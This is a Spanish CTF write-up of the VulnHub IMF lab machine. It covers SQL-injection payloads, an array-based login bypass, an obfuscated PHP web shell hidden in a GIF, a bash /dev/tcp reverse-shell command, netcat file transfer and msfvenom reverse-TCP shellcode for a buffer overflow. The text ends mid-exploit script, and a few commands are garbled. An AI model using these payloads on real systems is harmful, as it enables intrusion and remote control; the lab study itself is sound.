---
title: "VulnHub: IMF"
date: 2025-10-31
tags:
  - writeup
  - vulnhub
  - sqli
  - escalada-privilegios
  - web-exploitation
  - BoF
related:
  - "[[SQLi-Manual]]"
  - "[[Git-Reconnaissance]]"
  - "[[Linux-Privesc]]"
  - "[[SSH-Techniques]]"
references:
  - https://www.vulnhub.com/entry/imf-1,162/
---
![[CTFIMF.Cover.png]]
# Información General  
>Este documento contiene información detallada de cómo comprometer la máquina IMF en VulnHub. Se abordan principalmente las técnicas: **SQLi Boolean Blind** y **Buffer Overflow**.
---
## Objetivos
- Comprometer la máquina virtual [IMF: 1](https://www.vulnhub.com/entry/imf-1,162/).
- Obtener acceso inicial mediante enumeración web.
- Escalar privilegios hasta root mediante abuso de servicios vulnerables.
- Capturar las 6 flags.
## Técnicas Aplicadas
- **Reconocimiento de Red**: Identificación de objetivos mediante ARP y TCP  
- **Enumeración de Servicios**: Detección de versiones y aplicaciones  
- **Análisis Manual de Código**: Identificación de secretos en código fuente  
- **SQL Injection Boolean-Based**: Automatización de explotación  
- **Bypass de WAF**: Inserción de payloads en archivos GIF  
- **Reverse Shell**: Obtención de acceso remoto  
- **Port Knocking**: Acceso a servicios protegidos  
- **Buffer Overflow**: Escalada de privilegios  
### Entorno de Trabajo
Este writeup fue realizado bajo las siguientes condiciones:
- **Hipervisor**: VMware Workstation Pro
- **Sistema Operativo Host**: Arch Linux
- **Máquina Atacante**: Kali Linux (virtualizada)
- **Máquina Objetivo**: IMF 1 (VulnHub)
- **Red**: vmnet1 (Red privada de VMware)
## Herramientas y Comandos Usados

| Herramienta | Función principal                             |
| ----------- | --------------------------------------------- |
| arp-scan    | Descubre hosts en la red.                     |
| nmap        | Escaneo y enumeración de puertos y servicios. |
| Burp Suite  | Análisis y pruebas de tráfico web.            |
| curl        | Transferencia de datos y pruebas HTTP.        |
| TCPing      | Verifica conectividad TCP sin ICMP.           |
| netcat      | Utilidad multipropósito de red.               |
| ssh         | Acceso remoto seguro por consola.             |
| htop        | Monitorización avanzada de procesos.          |
| netstat     | Revisión de conexiones y puertos activos.     |
| ltrace      | Rastreo de llamadas de biblioteca.            |
| gdb         | Depurador para análisis de binarios.          |

---
# Solución General

> [!Abstract] Resumen Técnico  
> Este writeup guía paso a paso cómo explotar una máquina Linux vulnerable mediante inyección SQL Boolean-Based y Buffer Overflow. El objetivo es enseñar cómo funcionan estas vulnerabilidades desde una perspectiva práctica y educativa.

## 1. Reconocimiento:  

La fase de **reconocimiento** es el cimiento de cualquier pentest exitoso. Durante esta etapa:

- **Identificamos el alcance**: Qué máquinas y servicios tenemos como objetivo
- **Mapeamos la infraestructura**: Entendemos cómo se conectan los sistemas
- **Detectamos servicios**: Encontramos qué aplicaciones están corriendo y en qué versiones

Sin reconocimiento adecuado, **disparamos a la oscuridad**. Con él, nos movemos con precisión quirúrgica.
### 1.1 Fase Inicial | arp-scan y tcping

Lo primero que hago es reconocer qué máquina voy a atacar. Para ello, debo identificar la IP de la máquina víctima, esto se hace con ayuda de la herramienta `arp-scan`.

**¿Qué es ARP?** Address Resolution Protocol (ARP) es un protocolo que mapea direcciones IP a direcciones MAC en una red local. Cuando una máquina quiere comunicarse con otra en la misma red, primero necesita saber su dirección MAC. ARP hace exactamente eso.

Comando utilizado:
```bash
arp-scan -I vmnet1 --localnet
```

Parámetros:
- `arp-scan`: Herramienta de reconocimiento de red
- `-I`: Especifica el adaptador de red a escanear
- `--localnet`: Indica escaneo de toda la red local

![[CTFIMF.00.png]]
Este escaneo me identifica la máquina objetivo en "`172.16.23.129`" dentro de mi red `vmnet1`.

Identificamos que hay una máquina, por lo que podemos ejecutar el comando ping para verificar conección con la máquina:

```bash
ping 172.16.23.129
```
![[CTFIMF.01.png]]
No hay conexión por medio de ping.

**¿Por qué falla ping?** El comando "ping" usa el protocolo ICMP (Internet Control Message Protocol), que envía paquetes de eco para saber si un dispositivo está accesible en la red. Sin embargo, muchos sistemas o firewalls pueden bloquear estos paquetes ICMP por seguridad, por lo que "ping" puede fallar aunque el dispositivo esté activo.

Al no obtener respuesta con ICMP, probaremos la herramienta [tcping](https://github.com/cloverstd/tcping) para verificar la conexión mediante el protocolo TCP. `tcping` usa TCP para intentar establecer una conexión directa a un puerto específico en la máquina destino (por ejemplo, puerto 80, 443, etc.). Esto permite verificar si un servicio en ese puerto está disponible y funcionando, sin depender de que ICMP esté permitido.

Una vez compilada, ejecutamos:
```bash
./tcping 172.16.23.129
```
![[CTFIMF.02.png]]

Confirmamos conexión con `172.16.23.129` por medio de la herramienta tcping.
### 1.2 Escaneo de puerto |  nMap
```bash
nmap -p- --open -sS 172.16.23.129 -T4 -n -vvv -Pn -oA SYNscan 
```

Parámetros:
- `-p-`: Anula el comportamiento por defecto de nmap (que escanea los 1000 puertos más comunes) y escanea **todos** los puertos (1-65535)
- `--open`: Solo muestra los puertos que están abiertos, ignorando los cerrados o filtrados.
- `-sS`: Realiza un escaneo SYN stealth (Half-open scan), que envía paquetes SYN para detectar puertos abiertos sin completar la conexión TCP (menos detectable).
- `-T4`: Ajusta la velocidad del escaneo a un nivel agresivo (más rápido, menos sigiloso).
- `-n`: No resuelve nombres DNS para las IPs, acelera el escaneo al evitar consultas DNS.
- `-vvv`: Muestra salida muy detallada (nivel de verbosidad triple).
- `-Pn`: No realiza ping previo para detectar si el host está activo; asume que está activo y escanea directamente.
- `-oA SYNscan`: Exporta la salida en tres formatos simultáneamente (normal, XML y grepable) usando el prefijo de archivo "SYNscan".

![[CTFIMF.03.png]]
### 1.3 Escaneo de servicios | nmap
Ya que sabemos que tenemos el puerto 80 abierto, es el momento de utilizar un conjunto de scripts de reconocimiento que tiene nmap que nos permitirá identificar exactamente a qué nos estamos enfrentando con información más detallada.

Comando utilizado:
```bash
nmap -p80 -sCV 172.16.23.129 -oA PORTscan   
```
Parámetros:
- `-p80`: Escanea específicamente el puerto 80.
- `-sCV`: Detecta servicios (`-sV`) y ejecuta scripts de reconocimiento básicos (`-sC`).
- `-oA PORTscan`: Exporta la salida en tres formatos simultáneamente.


![[CTFIMF.04.png]]
Resultado: Equipo con puerto 80/tcp abierto, servicio Apache httpd 2.4.18 corriendo en máquina Ubuntu | Aplicación web: IMF
### 1.4 Reconocimiento Web | Puerto 80

Introducimos la IP `172.16.23.129` como URL en nuestro navegador web y vemos que la misma cuenta con 3 "secciones":
- **Home** (index.php)
- **Projects** (projects.php)
- **Contact Us** (contact.php)

![[CTFIMF.05.png]]
#### Código Fuente | Index.php 
![[CTFIMF.06.png]]

Encontramos unos segmentos de JavaScript encriptados en base64. Esto es bastante curioso de ver en un código fuente, porque cuando juntamos todos los segmentos obtenemos la cadena: "`ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==`"

> Base64 es un esquema de codificación que convierte datos binarios en texto ASCII. Se usa comúnmente para transmitir datos que no pueden ser enviados directamente (como credenciales o datos binarios) a través de protocolos que solo aceptan texto.

Se identifica fácilmente que es una cadena base64, por lo que procedemos a decodificarla:
```bash
 echo "ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==" | base64 -d; echo
```

![[CTFIMF.07.png]]
Resultado: `flag2{aW1mYWRtaW5pc3RyYXRvcg==}`

Esta es otra cadena base64, vamos a decodificarla nuevamente:
```bash
echo "aW1mYWRtaW5pc3RyYXRvcg==" | base64 -d; echo
```
![[CTFIMF.08.png]]
Resultado: **imfadministrator** - Esto parece ser una ruta o directorio administrativo.
#### Código Fuente | projects.php

![[CTFIMF.09.png]]
Aquí no hay mucho que ver, parece una página con solo información relacionada a los proyectos de la aplicación web. No contiene datos sensibles.
#### Código Fuente | contact.php

![[CTFIMF.10.png]]
Esta página es mucho más interesante que las otras dos. En el formulario vemos claramente tres posibles usuarios por lo que los guardamos, seguramente sirven para más tarde.

![[CTFIMF.11.png]]
Además, en su código fuente encontramos la `flag1{YWxsdGhlZmlsZXM=}`. Vemos que también está en `base64` por lo que procedemos a decodificarla:
```bash
echo "YWxsdGhlZmlsZXM=" | base64 -d; echo
```
![[CTFIMF.12.png]]
Resultado: **allthefiles** - Pista que nos sugiere revisar todos los archivos.
Recuento de Información:

> [!success] Flags Capturadas: 
> - `flag1{allthefiles}`
> - `flag2{imfadministrator}`

> [!success] Usuarios Identificados: 
> - Roger S. Michaels: rmichaels@imf.local
> - Alexander B. Keith: akeith@imf.local
> - Elizabeth R. Stone: estone@imf.local
---

## 2. Explotación

Podemos intuir que las flags son pistas para seguir con el reto. En este caso:
- "`flag1{allthefiles}`" nos invita a revisar todos los archivos del aplicativo
- "`flag2{imfadministrator}`" nos indica lo que parece ser un directorio administrativo

Confirmamos esto ingresando en la URL: `http://172.16.23.129/imfadministrator/`
![[CTFIMF.13.png]]
Parece un panel de inicio de sesión administrativo. Este es el momento perfecto para probar los usuarios que habíamos encontrado anteriormente, confirmando no solo que los usuarios existen, sino que **la web también es vulnerable a enumeración de usuarios**.

![[CTFIMF.14.png]]
Revisando el código fuente también podemos ver pistas en los comentarios de la web. Parece que dejaron toda la sanitización en el traste por lo que ya podemos a probar cosas con el Repeater de BurpSuite.
### 2.1 Array Injection Authentication Bypass |  BurpSuite

![[CTFIMF.15.png]]
Con un simple `[]` (corchetes vacíos) en el parámetro de login podemos ver que la web nos da acceso al panel administrativo. Esto ocurre porque:

> En PHP, cuando usas `[]` en un formulario GET o POST, conviertes un parámetro de string en un array. El backend espera un string y lo compara directamente, pero recibe un array. Dependiendo de cómo se escribe el código, esta comparación fallida puede resultar en un bypass de autenticación. Es un ejemplo clásico de cómo las suposiciones sobre el tipo de datos pueden llevar a vulnerabilidades.

Al presionar con el payload `[]` el sistema nos concede acceso y nos entrega la **flag3**: `flag3{Y29udGludWVUT2Ntcw==}`

Decodificamos:
```bash
echo "Y29udGludWVUT2Ntcw==" | base64 -d; echo
```
![[CTFIMF.16.png]]
Resultado: **continueTOcms** - Nueva pista hacia el CMS.
### 2.2 Panel Administrativo CMS
También tenemos un enlace que nos lleva a `http://172.16.23.129/imfadministrator/cms.php?pagename=home` por lo que al ingresar podemos ver el contenido del panel administrativo:

**Secciones disponibles:**
- Home
- Upload Report
- Disavowed list

![[CTFIMF.17.png]]
![[CTFIMF.18.png]]
![[CTFIMF.19.png]]
![[CTFIMF.20.png]]
No hay nada interesante en los códigos fuentes de estas páginas a simple vista. Sin embargo, hay algo crucial que pasamos por alto...
## 3. Preparativos para el Ataque - SQL Injection Boolean Blind

### 3.1 Identificación de la Vulnerabilidad

Nos damos cuenta de que la página tiene un parámetro interesante: `cms.php?pagename=home`. 

![[CTFIMF.21.png]]
Ese `=` es bastante curioso ya que está apuntando a recursos, por lo que vamos a probar colocando una comilla `'` (comilla simple). Esto nos da una pantalla **WARNING** de **SQL**, confirmando que hay una inyección SQL:
![[CTFIMF.22.png]]
### 3.2 Concepto: SQL Injection Boolean Blind

> SQLi es una vulnerabilidad donde un atacante inyecta código SQL malicioso en los campos de entrada de una aplicación. Si la entrada no está sanitizada, el código ejecuta consultas SQL no autorizadas.
- **Boolean**: La respuesta es sí o no (true/false)
- **Blind**: No vemos directamente los resultados de la base de datos

En un **SQL Injection Boolean Blind**, no podemos ver los datos de la base de datos como lo haríamos en un Error-Based SQLi. En su lugar, nos basamos en diferencias de comportamiento:
- Si nuestra condición es **TRUE**, la página muestra cierto contenido/comportamiento
- Si nuestra condición es **FALSE**, muestra otro contenido/comportamiento

**¿Cómo funciona?** Comparamos dos estados:
```
-- Estado TRUE
pagename=home' AND '1'='1'--
La página carga normalmente

-- Estado FALSE  
pagename=home' AND '1'='0'--
La página muestra un error o contenido diferente
```

Con esto, podemos "preguntar" a la base de datos letra por letra, extrayendo **información sin necesidad ver nunca los datos directamente**.
### 3.3 Pruebas Manuales de Boolean SQLi

Interceptamos la solicitud GET con Burp Suite:
```
GET /imfadministrator/cms.php?pagename=home' or 1=1--
```

El payload de la imagen está URL-encoded al enviar las solicitudes, puedes hacerlo fácilmente con Burp Suite al presionar `Ctrl + U`.

![[CTFIMF.23.png]]

Notamos que la solicitud en sí no cambia mucho visualmente, pero al leer detenidamente podemos apreciar que hay un error que dice:

```
mysqli_fetch_row() expects parameter 1 to be mysqli_result, boolean given in 
```

Este error es un **claro indicio** de que hay un **error relacionado a parámetros booleanos**, confirmando una vulnerabilidad Boolean SQLi.

```
mysqli_fetch_row() expects parameter 1 to be mysqli_result, boolean given in 
```

#### Confirmación de Boolean SQLi

Con esto podemos identificar que hay una base de datos trabajando con SQL, ademas vemos ese **bolean given in** es un claro indicio a que hay un error relacionado a parámetros booleanos, teniendo esto en cuenta vamos a probar los payload: dando el servidor respuestas distintas y confirmando **boolean sqli** 

hora probamos dos payloads específicos para confirmar el comportamiento booleano:

**Payload TRUE (debe cargar la página normalmente):**
```
home' AND '1'='1'--
```
![[CTFIMF.24.png]]

**Payload FALSE (debe mostrar un error o comportamiento diferente):**
```
home' AND '1'='0'--
```
![[Pasted image 20251102010623.png]]

Con esto en cuenta podemos ver claramente dos respuestas distintas, confirmando la vulnerabilidad **Boolean Blind SQLi**.

### 3.4 Extracción Manual de Información

Por ejemplo, podemos empezar a cambiar las solicitudes por palabras:

```
home' AND 'test'='test'--
```
![[CTFIMF.25.png]]
De esta forma tenemos una forma de identificar entradas en las bases de datos. A pesar de que no veamos exactamente la entrada, tenemos una forma de ir buscando información.

Supongamos que queremos buscar bases de datos, podemos usar una de las entradas para seleccionar mediante queries nombres de las mismas e ir fuzzeando las misma.
### 3.5 Descubrimiento de Esquemas de Base de Datos

Como sabemos que es una base de datos trabajando bajo SQL podemos probar solicitudes que apunten a nombres comunes de las mismas, por ejemplo `mysql` o `information_schema`.

> information_schema es una base de datos especial en MySQL que contiene metadatos sobre TODAS las demás bases de datos, tablas, columnas, etc. Es como el "índice" de la base de datos.

Usamos el payload
```
home' AND (SELECT schema_name FROM information_schema.schemata limit 0,1)='information_schema-- HTTP/1.1
```
**Desglose**:
- `SELECT schema_name`: Selecciona nombre del esquema
- `FROM information_schema.schemata`: De la tabla de esquemas
- `limit 0,1`: Primer resultado
- `='information_schema'`: ¿Es igual a esto?

**Estado FALSE** (nombre incorrecto):
![[CTFIMF.26.png]]

**Estado TRUE** (confirmamos information_schema existe):
![[Pasted image 20251102174257.png]]
✅ Confirmado: existe la BD `information_schema`.
### 3.6 Fuzzing letra por letra

El verdadero poder: extraer información **desconocida**. En lugar de buscar nombres completos, **fuzzeamos letra por letra**.

**El concepto**: Usamos `substring()` para extraer caracteres uno a uno:
```sql
home' AND (SELECT substring(schema_name,1,1) FROM information_schema.schemata limit 0,1)='i--
```
**Desglose**:
- `substring(schema_name,1,1)`: Primera letra del nombre
- `limit 0,1`: Primera BD
- `='i'`: ¿Es igual a "i"?

Fíjate como ahora  seleccionamos la **primera letra** de la **primera base de datos**, sabemos que la primera BD es `information_schema`, cuya primera letra es **"i"** → **TRUE**:
![[CTFIMF.27.png]]
Para la segunda letra: `substring(schema_name,2,1)='n'` y así sucesivamente.

**¿Por qué funciona?** La función `substring()` extrae N caracteres desde una posición. Si probamos 'i', es TRUE. Si probamos 'x', es FALSE. **Letra por letra extraemos cualquier información**.

---
## 4. Automatización - Script Python

Hacer esto manualmente es **tedioso**. Un script automatiza el proceso:

**Mi Script**: https://github.com/NeTenebraes/neBooleanBlindSQLi

El script:
1. Define el parámetro vulnerable
2. Itera sobre caracteres ASCII
3. Para cada posición, prueba cada carácter
4. Si respuesta = TRUE, guarda carácter
5. Continúa hasta completar la cadena

**Resultado**: Encontramos página oculta: `http://172.16.23.129/imfadministrator/cms.php?pagename=tutorials-incomplete`

Si quieres ver exactamente como funciona este script y estos conceptos, te recomiendo que visites el [repositorio](https://github.com/NeTenebraes/neBooleanBlindSQLi).

![[Pasted image 20251123022459.png]]
**Resultado**: Encontramos página oculta: `http://172.16.23.129/imfadministrator/cms.php?pagename=tutorials-incomplete`

--- 
### 4.1 Página Descubierta: tutorials-incomplete
![[CTFIMF.28.png]]

Hay un QR. Lo escaneamos con herramienta web segura:

**QR Decodificado**: `flag4{dXBsb2Fkcjk0Mi5waHA=}`

```bash
echo "dXBsb2Fkcjk0Mi5waHA=" | base64 -d; echo
```

**Resultado**: **uploadr942.php** ← Una página oculta de carga de archivos.

## 5. Bypass WAF y Reverse Shell

### 5.1 Acceso al Uploader

Navegamos a `http://172.16.23.129/imfadministrator/uploadr942.php`:
![[CTFIMF.29.png]]
En esta sección vemos que se pueden subir documentos, sin embargo la gran mayoría de extensiones están bloqueadas por un WAF. Por lo que usaremos un archivo de prueba para empezar a hacer fuzzing, confirmando que archivos con extensión de imagen puedes ser subidos al servidor.

**¿Por qué probamos con imágenes?** A través de fuzzing de extensiones y MIME types, identificamos que:
1. El WAF filtra extensiones `.php`, `.php3`, `.php4`, `.php5`, etc.
2. El WAF permite extensiones de imagen: `.jpg`, `.png`, `.gif`, `.bmp`
3. Esto nos sugiere que podemos inyectar código PHP dentro de un archivo de imagen válido
   
Necesitamos **bypassear el WAF** (Web Application Firewall).

**Magic Numbers (File Signatures)**:
Los magic numbers (también llamados file signatures) son bytes específicos al inicio de un archivo que identan su tipo. Por ejemplo:
- **PNG**: `89 50 4E 47` (`PNG` en hexadecimal)
- **JPEG**: `FF D8 FF E0`
- **GIF**: `47 49 46 38` (`GIF8` en hexadecimal)

El WAF puede validar el archivo verificando estos magic numbers en lugar de solo la extensión. Si insertamos código PHP dentro de una imagen con magic numbers válidos, podemos bypassear el filtro.

### 5.3 Creación del Payload

**Opción 1: Usar una función ofuscada en PHP**

Creamos un archivo `shell.gif` que contiene:
```php
<?php
$f = 'sy'.'stem';
$f($_GET['cmd']);
?>
```

Esta técnica ofusca la función `system()` dividiéndola en strings, dificultando la detección por patrones del WAF.

**Opción 2: Usar comillas invertidas (backticks)**

```php
<?php
$command = $_GET['cmd'];
echo `$command`;
?>
```

Los backticks en PHP ejecutan comandos del sistema, es una alternativa a `system()` que puede evadir algunos filtros.

### 5.4 Subida del Archivo

Subimos `script.gif` desde el formulario de `uploadr942.php` modificando la solicitud con BurpSuite para que incluya lo que queremos que el WAF valide. 

Modificamos para el WAF:
- ✅ Extensión: `.gif` (permitido)
- ✅ MIME type: `image/gif` (permitido)
- ✅ Magic number: `GIF8` (válido)
  
![[CTFIMF.30.png]]
El archivo se guarda en el servidor. Típicamente en: `/imfadministrator/uploads/`

Además, de la respuesta del servidor podemos ver que guarda los archivos con un nombre distinto (hash).
![[Pasted image 20251123032542.png]]
Confirmamos esto viendo una de las imágenes que habías subido en la ruta mencionada:
![[Pasted image 20251123032716.png]]
### 5.6 Ejecución de Comandos

Una vez que tenemos acceso a través del shell web, ejecutamos comandos con ayuda de curl:

```bash
# Prueba de RCE (Remote Code Execution)
curl "http://172.16.23.129/imfadministrator/uploads/shell.gif?cmd=ls"

# Listar directorio actual
curl "http://172.16.23.129/imfadministrator/uploads/shell.gif?cmd=pwd"

# Ver usuario actual
curl "http://172.16.23.129/imfadministrator/uploads/shell.gif?cmd=whoami"
```

**¡CONFIRMAMOS EJECUCIÓN DE COMANDOS!**
![[Pasted image 20251123033137.png]]
![[Pasted image 20251123033235.png]]
>  Luego e confirmar que se puede hacer ejecución de comandos, encontramos la`flag5{YWdlbnRzZXJ2aWNlcw==}` a través del comando `ls` para posteriormente ver su contenido con `cat`. 

Resultado:
```bash
echo "YWdlbnRzZXJ2aWNlcw==" | base64 -d; echo
# Output: agentservices
```

### 5.7 Obtención de Reverse Shell

Con RCE confirmado, procedemos a obtener una reverse shell interactiva.

**Paso 1: Preparar la máquina atacante para escuchar**

```bash
# En la máquina atacante (Kali)
nc -lvnp 443
# O usar socat para mejor TTY
socat FILE:`tty`,raw,echo=0 TCP-LISTEN:443
```

**Paso 2: Enviar payload de reverse shell**

Generamos el payload, acá te lo dejo de forma clara

```bash
# Payload: bash reverse shell
bash -c 'bash -i >& /dev/tcp/172.16.23.1/443 0>&1'
```

El signo `&` requiere ser URL-encoded como `%26` asi como tambien los espacios yo uso BurpSuite para esto haha:
```bash
curl "http://172.16.23.129/imfadministrator/uploads/2a7475f285e3.gif?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/172.16.23.1/443%200%3E%261%27"
```
![[Pasted image 20251123034056.png]]
**Resultado**: CONECTADOS - Tenemos acceso a la máquina.
### 5.8 Estabilización de TTY

Una vez que tenemos conexión reverse, la shell es inestable. Procedemos a estabilizar:

**Paso 1: Script para TTY**
```bash
/usr/bin/script -qc /bin/bash /dev/null
```

**Paso 2: Suspender el proceso**
Presionamos `Ctrl+Z` para suspender la shell.

**Paso 3: Reconfigurar terminal**
```bash
stty raw -echo; fg
```

**Paso 4: Configurar TERM**
```bash
export TERM=xterm
export SHELL=/bin/bash
```

**Paso 5: Columnas y Filas de la terminal (dependiendo de las dimensiones de tu terminal)**
```bash
stty rows 40 columns 120
```

Ahora tenemos una shell completa con capacidades interactivas dentro de la maquina IMF.
![[Pasted image 20251123034156.png]]

---

## 6. Análisis Binario y Servicios Protegidos (Port Knocking)

### 6.1 Enumeración de Procesos

Una vez obtenida la shell en la máquina, el siguiente paso es enumerar los procesos en ejecución para buscar algún binario o servicio propio del reto que pueda estar corriendo con privilegios elevados. Utilicé los siguientes comandos::

```bash
# Listar procesos en ejecución
ps aux | grep root

# Buscar binarios SUID
find / -perm -4000 2>/dev/null

# Revisar servicios activos
netstat -tuln
```

En el resultado del `ps aux` se puede observar que, aparte de los procesos estándar de sistema, existe el proceso `/usr/sbin/knockd` corriendo como root. Esto es muy relevante porque **knockd es un demonio especialmente usado para port knocking**, una técnica que sirve para proteger servicios sensibles permitiendo la apertura de puertos solo tras recibir una secuencia correcta de "golpes" en puertos definidos.

![[Pasted image 20251123051345.png]]

> Confirmar la presencia de knockd deja muy claro que en este reto debes realizar **port knocking** para poder acceder a algún servicio protegido.  Esta observación es clave para el progreso en la máquina, porque si no ejecutas correctamente la secuencia de knocking, el puerto se mantiene cerrado.


![[Pasted image 20251123034721.png]]
Además del demonio de knockd, la salida del `netstat` nos sirve para identificar servicios adicionales — por ejemplo, el puerto `7788` utilizado por el binario vulnerable `agent`, que típicamente queda inaccesible hasta completar el knocking especificado por la máquina.​

### 6.2 Descubrimiento del servicio "Agent"

Basándonos en la `flag5{agentservices}` y el reconocimiento realizado, buscamos usamos FIND para buscar el archivos relacionados:
```bash
find / -name "*agent*" 2>/dev/null
```
![[Pasted image 20251123051621.png]]

Encontramos que existe `/usr/local/bin/agent`. Al ejecutarlo vemos que espera un ID:
![[Pasted image 20251123035449.png]]

Dentro del mismo directorio encontramos un archivo llamado `access_codes` que contiene: `SYN 7482,8279,9467`
![[Pasted image 20251123035800.png]]
### 6.3 Análisis del Binario con ltrace

`ltrace` nos permite ver las llamadas a librerías sin necesidad de desensamblar. Esto acelera el análisis. Nos permitirá rastrear llamadas a librerías dinámicamente, esto es especialmente útil para entender qué hace el programa:

```bash
ltrace /usr/local/bin/agent
```

Observamos que el programa:
- Lee entrada del usuario
- Compara la entrada de ID con `48093572`
- Realiza operaciones de buffers si la validación es exitosa

![[Pasted image 20251123035047.png]]

### 6.4 Identificación del ID Válido

Ejecutamos el binario del agent:
```bash
/usr/local/bin/agent
# Ingresamos: 48093572
```
![[Pasted image 20251123044458.png]]
El binario nos presentará opciones. Seleccionamos opción 3 para explotar el buffer overflow.


### 6.5 Traer el equipo a la maquina

ATACANTE
```
sudo nc -nlvp 443 > agent
```

VICTIMA 
```
nc 172.16.23.1 443 < agent
```

Vamos a traernos el binario a nuestro PC para trabajar más cómodamente con el 

![[Pasted image 20251123064856.png]]
De esta forma, podemos usar trabajar con todos nuestros juguetes con el binario, sin necesidad de depender de los paquetes que tenga la máquina victima.

---
## 7. Explotación Buffer Overflow

> [!warning] SECCIÓN MEJORADA - Rigor Técnico Añadido
> Las siguientes subsecciones (7.1 a 7.4) incluyen explicaciones detalladas sobre el cálculo del offset y la obtención de la dirección de retorno. Se han añadido conceptos técnicos profundos basados en análisis binario.

### 7.1 Concepto Fundamental: Buffer Overflow

Un **Buffer Overflow** ocurre cuando un programa escribe más datos en un buffer de lo que puede almacenar. Esto causa que los datos adicionales sobrescriban la memoria adyacente, incluyendo potencialmente la dirección de retorno de una función en la pila.

**Estructura de la pila durante una llamada a función:**

```
[Espacio Local del Buffer]  ← Donde escribimos datos
[EBP - Base Pointer]        ← Puntero de la base del marco
[RIP/EIP - Return Address]  ← Dirección de retorno (nuestro objetivo)
[Parámetros de Función]
```

Cuando un buffer se desborda, podemos sobrescribir el RIP/EIP y hacer que apunte a código malicioso (shellcode) que queramos.

### 7.2 Cálculo del Offset: Explicación Detallada

El **offset** es la cantidad exacta de bytes que debemos escribir antes de sobreescribir la dirección de retorno. Encontrarlo requiere:
#### Paso 1: Generar un Patrón Único

Podemos generar un patrón único con `gdb`, `gef` (GDB Enhanced Features) o `python`, de esta forma tendremos una cadena no repetitiva que nos permitirá identificar exactamente dónde está la dirección de retorno:

```bash

python3 -c "import string; print(''.join([chr((i % 26) + ord('A')) for i in range(300)]))"
```

Incluso, una forma **más precisa** podría ser usar el script `pattern_create` de metasploit:
```bash
pattern_create.rb -l 300
# Yo tengo el script en: /opt/metasploit/tools/exploit/pattern_create.rb
```

Este patrón tiene la propiedad de que cada subsecuencia de 4 bytes es única.
![[Pasted image 20251123060751.png]]

#### Paso 2: Enviar el Patrón y Observar el Crash

Copiamos el patrón generado y lo enviamos al binario `agent` a través de la opción 3:

```bash
./agent
# ID: 48093572
# Opción: 3
# Pegamos el patrón...
```
> Recuerda que es un binario X86, requieres tener los paqutees necesarios para correr binarios en caso de que tṕu máquina sea de X64. En mi caso un "sudo pacman -S lib32-glibc" fue más que suficiente.

El programa hace crash. Revisamos el valor en el registro **EIP** (para arquitectura x86) 
![[Pasted image 20251123060842.png]]
#### Paso 3: Encontrar la Posición

Si el programa está corriendo bajo `gdb`:

```bash
gdb /usr/local/bin/agent
(gdb) run
# ... (ingresamos ID y opción 3, pegamos patrón)
# Cuando hace crash:
(gdb) info registers eip
# eip            0x41376141          0x41376141   <- Estos bytes están en nuestro patrón
```

En este caso, vemos `0x41376141` que en ASCII es "A7aA". Usamos `msf-pattern_offset` para encontrar su posición:

```bash

 -l 300
# Output: [*] Exact match at offset 168
```

**¡El offset es exactamente 168 bytes!**

**Explicación técnica:**
- Los primeros 168 bytes llenan el buffer local
- El byte 169 en adelante sobrescribe registros guardados (SFP - Saved Frame Pointer) en x86
- Los bytes que siguen sobrescriben la dirección de retorno (RIP/EIP)

En x86 de 32 bits:
- Bytes 0-167: Buffer
- Bytes 168-171: RIP/EIP (4 bytes en x86)

Por lo tanto, si queremos sobrescribir el RIP/EIP, necesitamos exactamente **168 bytes de relleno + 4 bytes con la dirección deseada**.

### 7.3 Obtención de la Dirección de Retorno (0x08048563)

Ahora que sabemos que en el offset 168 está el RIP/EIP, ¿dónde colocamos nuestro shellcode? La respuesta es: **apuntamos el RIP/EIP a la dirección donde empieza nuestro shellcode**.

#### ¿De dónde sale 0x08048563?

Esta dirección debe identificarse mediante:

**Opción 1: Análisis Manual con GDB**

```bash
# Abrimos el binario en GDB
gdb /usr/local/bin/agent

# Listamos la función vulnerable
(gdb) disassemble agent
# O la función que maneja la entrada

# Buscamos donde empieza el buffer
(gdb) disass <nombre_funcion>
0x08048563  <+NNN>:    lea    -0xA8(%ebp),%eax
0x08048569  <+NNN>:    mov    %eax,0x8(%esp)
0x0804856d  <+NNN>:    mov    0x8(%ebp),%eax
0x08048570  <+NNN>:    mov    %eax,(%esp)
0x08048573  <+NNN>:    call   0x8048400 <strcpy@plt>
```

La dirección `0x08048563` es la dirección donde comienza la instrucción que maneja nuestro buffer. Cuando saltamos aquí, el programa ejecuta nuestro shellcode.

**Opción 2: Encontrar la Dirección del Buffer**

```bash
# El buffer generalmente está en la pila
# Su dirección se puede encontrar con:

gdb-peda$ x/20x $esp
# Vemos direcciones de la pila

# O usar checksec para ver protecciones:
checksec /usr/local/bin/agent

# Si hay ASLR (Address Space Layout Randomization):
# Cada ejecución tiene direcciones diferentes
# Necesitaramos una técnica de información leak o ROP gadgets
```

En este caso **sin ASLR**, la dirección del buffer es **predecible**.

**Opción 3: Usar NOP Sled (Técnica de Confiabilidad)**

Una técnica común es usar un **NOP sled** (secuencia de instrucciones NOP - No Operation):

```
[168 bytes de padding]
[Dirección de retorno: 0x08048563]  ← Apunta al inicio del sled
[100 bytes de NOPs: 0x90 x 100]    ← Se "desliza" hasta el shellcode
[Shellcode ~72 bytes]
```

Los NOPs permiten que aunque la dirección exacta sea ligeramente imprecisa, las instrucciones simplemente no hacen nada y el procesador continúa hasta el shellcode.

### 7.4 Generación de Payload con msfvenom

Ahora que entendemos cómo y dónde saltamos, generamos nuestro shellcode:

```bash
# Generar shellcode reverse TCP
msfvenom -p linux/x86/shell_reverse_tcp \
  LHOST=172.16.23.1 \
  LPORT=443 \
  -f python \
  -b "\\x00\\x0a\\x0d"
```

Parámetros explicados:
- `-p`: Payload (shell reverso TCP)
- `LHOST`: IP donde escucharemos
- `LPORT`: Puerto donde escucharemos
- `-f python`: Formato de salida (código Python que podemos copiar directamente)
- `-b`: Bytes a evitar (badchars):
  - `\\x00`: Null bytes (terminan strings en C)
  - `\\x0a`: Newline (interfiere con entrada)
  - `\\x0d`: Carriage return (causa problemas de parsing)

**Ejemplo de salida:**

![[Pasted image 20251123042220.png]]

El shellcode generado es un binario compilado que:
1. Crea un socket TCP
2. Se conecta a 172.16.23.1:443
3. Redirige stdin/stdout/stderr al socket
4. Ejecuta `/bin/bash`

### 7.5 Estructura del Exploit

El exploit combina el shellcode, padding para alcanzar el offset, y la dirección de retorno:

**Script Python - Exploit**:

```python
#!/usr/bin/python3

import socket
import sys

